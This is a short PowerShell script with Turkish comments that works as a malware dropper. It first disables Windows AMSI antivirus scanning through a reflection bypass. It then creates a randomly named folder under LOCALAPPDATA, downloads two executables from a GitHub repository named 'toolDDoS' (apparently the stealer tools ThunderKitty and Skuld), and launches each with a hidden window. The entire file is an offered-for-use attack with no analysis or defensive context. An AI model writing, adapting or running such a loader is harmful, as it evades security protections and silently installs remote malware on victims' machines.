param([int]$Retries = 5, [int]$BaseDelay = 5)

function Disable-Amsi {
    $asm = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetName().Name -eq 'System.Management.Automation' } | Select-Object -First 1
    if ($asm) {
        $type = $asm.GetType('System.Management.Automation.AmsiUtils')
        $flags = [Reflection.BindingFlags]::NonPublic -bor [Reflection.BindingFlags]::Static
        $field = $type.GetField('amsiInitFailed',$flags)
        if ($field) {
            $field.SetValue($null,$true)
        }
    }
}

Disable-Amsi

function Download-Reliable {
    param($Url, $Out)
    for ($i = 1; $i -le $Retries; $i++) {
        try {
            $wc = New-Object Net.WebClient
            $wc.Headers['User-Agent'] = 'PowerShell'
            $wc.DownloadFile($Url, $Out)
            if (Test-Path $Out) {
                return $true
            }
        }
        catch {}
        Start-Sleep -Seconds ($BaseDelay * [Math]::Pow(2, $i-1) + (Get-Random -Max 5))
    }
    return $false
}

$r1 = [guid]::NewGuid().ToString('N')
$dir = Join-Path $env:LOCALAPPDATA $r1
New-Item -Path $dir -ItemType Directory -Force | Out-Null

# 1. Dosya
$exe1 = Join-Path $dir "file1.exe"
$u1 = 'https://github.com/doguiaste/toolDDoS/raw/refs/heads/main/ThunderKitty-Built.exe'  # Buraya 1. dosya linki
if (Download-Reliable $u1 $exe1) {
    Start-Process -FilePath $exe1 -WindowStyle Hidden
} else {
    Write-Host "Dosya 1 indirilemedi." -ForegroundColor Red
}

# 2. Dosya
$exe2 = Join-Path $dir "file2.exe"
$u2 = 'https://github.com/doguiaste/toolDDoS/raw/refs/heads/main/skuld.exe'  # Buraya 2. dosya linki
if (Download-Reliable $u2 $exe2) {
    Start-Process -FilePath $exe2 -WindowStyle Hidden
} else {
    Write-Host "Dosya 2 indirilemedi." -ForegroundColor Red
}

# Temizlik
# Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue
